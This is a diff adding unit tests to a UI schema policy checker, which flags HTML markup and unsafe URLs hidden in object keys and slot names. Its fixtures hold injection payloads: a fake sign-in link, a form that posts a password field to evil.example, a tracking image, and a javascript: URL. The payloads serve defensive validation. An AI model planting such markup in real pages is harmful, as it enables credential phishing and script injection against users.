@@ -768,6 +768,110 @@ test('checkPolicy keeps the html rule on an html-drawn property', () => {
   ).toEqual([]);
 });
 
+const markupKey =
+  '<a href="https://evil.example/login">Sign in again</a>' +
+  '<form action="https://evil.example/c" method="post"><input name="p" type="password"></form>' +
+  '<img src="https://evil.example/t.gif">';
+
+test('checkPolicy applies the html rule to an object key, as Descriptions draws item keys as HTML', () => {
+  const errors = checkText([
+    { id: 'd', type: 'Descriptions', properties: { items: { [markupKey]: 'x' } } },
+    { id: 'e', type: 'Descriptions', properties: { items: { Status: markupKey } } },
+  ]);
+  expect(errors.map(({ rule }) => rule)).toEqual(['policy.html', 'policy.html']);
+  expect(errors[0].path).toEqual(`blocks.0.properties.items.${markupKey}`);
+  expect(errors[0].message).toMatch(/^Key contains HTML tag syntax/);
+  expect(errors[1].path).toEqual('blocks.1.properties.items.Status');
+});
+
+test('checkPolicy checks link, form and source URLs in an object key when the policy allows tags', () => {
+  const errors = checkText(
+    [{ id: 'd', type: 'Descriptions', properties: { items: { [markupKey]: 'x' } } }],
+    { html: true, links: { pages: ['thanks'], origins: [] } }
+  );
+  expect(errors.map(({ rule }) => rule)).toEqual(['policy.urls', 'policy.urls', 'policy.urls']);
+  expect(errors.map(({ path }) => path)).toEqual(
+    Array(3).fill(`blocks.0.properties.items.${markupKey}`)
+  );
+});
+
+test('checkPolicy checks an object key as a URL, since no schema marks how a key is drawn', () => {
+  const errors = checkText([
+    {
+      id: 'd',
+      type: 'Descriptions',
+      properties: {
+        items: {
+          'https://evil.example/login': 'x',
+          '//evil.example': 'x',
+          'javascript:alert(1)': 'x',
+          'https://example.com/docs': 'x',
+        },
+      },
+    },
+  ]);
+  expect(rules(errors)).toEqual([
+    'policy.urls blocks.0.properties.items.https://evil.example/login',
+    'policy.urls blocks.0.properties.items.//evil.example',
+    'policy.urls blocks.0.properties.items.javascript:alert(1)',
+  ]);
+});
+
+test('checkPolicy checks slot and area names, which Tabs and Collapse draw as titles', () => {
+  const errors = check([
+    {
+      id: 'tabs',
+      type: 'Box',
+      slots: { [markupKey]: { blocks: [] }, 'https://evil.example': { blocks: [] } },
+    },
+    { id: 'panels', type: 'Box', areas: { '<b>x</b>': { blocks: [] } } },
+  ]);
+  expect(rules(errors)).toEqual([
+    `policy.html blocks.0.slots.${markupKey}`,
+    'policy.urls blocks.0.slots.https://evil.example',
+    'policy.html blocks.1.areas.<b>x</b>',
+  ]);
+});
+
+test('checkPolicy passes ordinary object keys and slot names', () => {
+  const errors = checkText([
+    {
+      id: 'd',
+      type: 'Descriptions',
+      style: { '@media (max-width: 600px)': { display: 'none' }, '&:hover': { color: 'red' } },
+      properties: {
+        title: 'Applicant',
+        items: { Name: 'Ann', 'Date of birth': '1990-01-01', 'Score (%)': 3, 'a < b': 'x' },
+      },
+    },
+  ]);
+  expect(errors).toEqual([]);
+  expect(
+    check([
+      {
+        id: 'tabs',
+        type: 'Box',
+        slots: { 'Tab one': { blocks: [] }, content: { blocks: [{ id: 'b', type: 'Box' }] } },
+      },
+    ])
+  ).toEqual([]);
+});
+
+test('checkPolicy leaves keys in data alone, as data is stored and never drawn', () => {
+  const errors = check([
+    {
+      id: 'b',
+      type: 'Box',
+      events: {
+        onMount: [
+          { id: 'set', type: 'SetState', params: { 'form.prefill': { '<b>Name</b>': 'Ann' } } },
+        ],
+      },
+    },
+  ]);
+  expect(errors).toEqual([]);
+});
+
 test('checkPolicy checks CSS url() in an html-drawn property when the policy allows tags', () => {
   const errors = checkText(
     [
